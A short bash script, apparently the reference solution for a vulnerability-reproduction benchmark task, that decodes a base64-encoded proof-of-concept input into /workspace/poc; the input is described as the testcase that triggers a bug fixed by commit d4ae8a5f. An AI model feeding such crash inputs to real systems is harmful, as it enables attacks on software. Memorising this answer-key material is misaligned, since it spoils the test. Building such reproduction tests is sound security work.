#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit d4ae8a5f addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
RQEB/AAAAAAABk7//0G+Lmt5Af////8AQAIAMOioqKh0qKioqKioqKio////////cABsHv//T1VkLA0KRkdFVCAwdf////v7RA0KQVV0SCAGDQq/NcI9MD0APn09PX09fX19fQD/AAAAAAAAAAEFAAAAAAAAACNCVCAgICAgICAgICAgIIWFcHJl0lVBT05ORUP///////////8AAAAsACz9DQoBABYWFhYWFhYLnf/////////////////////////7+0QNCkFVdEggBg0KQcTCPTA9gD59///////////////7+0QNCkFVdEggBg0KQcTCPTA9AD59PT19PX19//////////////v7RA0KQVV0SCAGDQpBxMIdMD0APn09PX09fX19fQAALf0NCgEAC53/////////////////////////+wpBRA1VbXT7SCAGDQpBxMINCkFVdEggBg0KQcTCPTE9gD59///////////////7+0QNCkFVdEg7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7IAYNCkHEwj2d//////////////////////////sKQUQNVW10+0ggBg0KQcTCDQpBVXRIIAYNCkHEwj0wPYA+ff////////////89PX09fX3///////////////////////////8ALP0NCgEAAA==
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
